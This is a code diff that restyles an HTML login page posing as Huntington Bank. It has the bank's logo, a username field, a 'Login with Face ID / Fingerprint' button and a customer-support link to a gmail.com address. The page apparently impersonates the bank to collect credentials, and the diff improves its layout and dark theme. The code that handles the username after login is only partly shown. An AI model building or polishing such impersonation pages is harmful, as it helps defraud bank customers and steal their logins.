@@ -6,62 +6,97 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     :root {
-      --bg-overlay: rgba(245,245,245,0.87);
-      --bg-img: url('IMG_0564.jpeg');
       --text-color: #000;
       --button-bg: #2d822a;
       --button-hover: #24691e;
       --link-color: #2d822a;
       --loading-bg: rgba(245,245,245,0.96);
       --loading-text-color: #222;
+      --heading-bg: url('IMG_0564.jpeg');
     }
 
     [data-theme='dark'] {
-      --bg-overlay: rgba(30,30,30,0.86);
-      --bg-img: url('IMG_0564.jpeg');
       --text-color: #fff;
       --button-bg: #3aa850;
       --button-hover: #2a8040;
       --link-color: #5ecc6c;
       --loading-bg: rgba(30,30,30,0.96);
       --loading-text-color: #fff;
+      --heading-bg: url('IMG_0564.jpeg');
     }
 
     body {
       font-family: sans-serif;
       text-align: center;
-      padding: 50px;
+      padding: 0;
+      margin: 0;
       min-height: 100vh;
-      background: var(--bg-overlay), var(--bg-img) center center/cover no-repeat fixed;
       color: var(--text-color);
-      transition: background-color 0.3s, color 0.3s;
+      background: var(--loading-bg);
+      transition: background 0.3s, color 0.3s;
       position: relative;
       z-index: 1;
     }
 
+    .theme-switch {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      z-index: 3;
+    }
+
+    .theme-switch label {
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .header-section {
+      background: var(--heading-bg) center center/cover no-repeat;
+      min-height: 210px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+      position: relative;
+    }
+
     .logo {
-      margin-bottom: 30px;
+      margin-bottom: 10px;
       z-index: 2;
       position: relative;
     }
 
     .logo img {
-      width: 250px;
+      width: 110px;
       height: auto;
-      box-shadow: 0 8px 32px rgba(0,0,0,0.08);
-      border-radius: 12px;
-      background: rgba(255,255,255,0.32);
-      backdrop-filter: blur(0.1rem);
+      display: block;
+      margin: 0 auto;
+      background: none;
+      border: none;
+      box-shadow: none;
+      border-radius: 0;
+      padding: 0;
     }
 
     h1 {
-      color: var(--text-color);
+      color: #fff;
       font-size: 24px;
+      margin: 5px 0 0 0;
+      font-weight: bold;
+      text-shadow: 0 2px 8px rgba(0,0,0,0.28);
+    }
+
+    .main-content {
+      padding: 30px 15px 0 15px;
+      max-width: 360px;
+      margin: 0 auto;
     }
 
     p {
       font-size: 16px;
       margin-bottom: 30px;
+      color: var(--text-color);
     }
 
     .input-group {
@@ -69,16 +104,21 @@
     }
 
     input[type="text"] {
-      width: 260px;
-      padding: 14px 12px;
-      font-size: 17px;
+      width: 250px;
+      padding: 12px 10px;
+      font-size: 16px;
       border: 1px solid #bbb;
       border-radius: 5px;
       margin-bottom: 10px;
       box-sizing: border-box;
       background: rgba(255,255,255,0.84);
       color: var(--text-color);
-      transition: border-color 0.2s;
+      transition: border-color 0.2s, background 0.3s, color 0.3s;
+    }
+    [data-theme='dark'] input[type="text"] {
+      background: rgba(30,30,30,0.84);
+      color: #fff;
+      border-color: #444;
     }
     input[type="text"]:focus {
       outline: none;
@@ -109,6 +149,7 @@
     .contact {
       margin-top: 40px;
       font-size: 16px;
+      color: var(--text-color);
     }
 
     a {
@@ -118,18 +159,6 @@
 
     a:hover {
       text-decoration: underline;
-    }
-
-    .theme-switch {
-      position: absolute;
-      top: 20px;
-      right: 20px;
-      z-index: 3;
-    }
-
-    .theme-switch label {
-      font-size: 14px;
-      cursor: pointer;
     }
 
     /* Loading overlay styles */
@@ -177,6 +206,7 @@
       border-radius: 4px;
       transition: width 0.2s;
     }
+
   </style>
 </head>
 <body>
@@ -187,22 +217,26 @@
     </label>
   </div>
 
-  <div class="logo">
-    <img src="IMG_0561.png" alt="Huntington Bank Logo">
+  <div class="header-section">
+    <div class="logo">
+      <img src="IMG_0561.png" alt="Huntington Bank Logo">
+    </div>
+    <h1>Welcome to Huntington Bank</h1>
   </div>
 
-  <h1>Welcome to Huntington Bank</h1>
-  <p>Secure biometric authentication is required to proceed.</p>
+  <div class="main-content">
+    <p>Secure biometric authentication is required to proceed.</p>
 
-  <div class="input-group">
-    <input type="text" id="usernameInput" placeholder="Enter your username" autocomplete="username">
-  </div>
+    <div class="input-group">
+      <input type="text" id="usernameInput" placeholder="Enter your username" autocomplete="username">
+    </div>
 
-  <button id="loginButton" onclick="biometricLogin()" disabled>Login with Face ID / Fingerprint</button>
+    <button id="loginButton" onclick="biometricLogin()" disabled>Login with Face ID / Fingerprint</button>
 
-  <div class="contact">
-    <h3>Need Help?</h3>
-    <p><a href="mailto:huntington.services.help@gmail.com">Contact Customer Support</a></p>
+    <div class="contact">
+      <h3>Need Help?</h3>
+      <p><a href="mailto:huntington.services.help@gmail.com">Contact Customer Support</a></p>
+    </div>
   </div>
 
   <!-- Loading animation overlay -->
@@ -228,9 +262,8 @@
     });
 
     function biometricLogin() {
-      // You can retrieve username value here if needed:
       const username = usernameInput.value.trim();
-      if (!username) return; // Just in case
+      if (!username) return;
 
       // Show loading overlay and animate
       const overlay = document.getElementById('loadingOverlay');
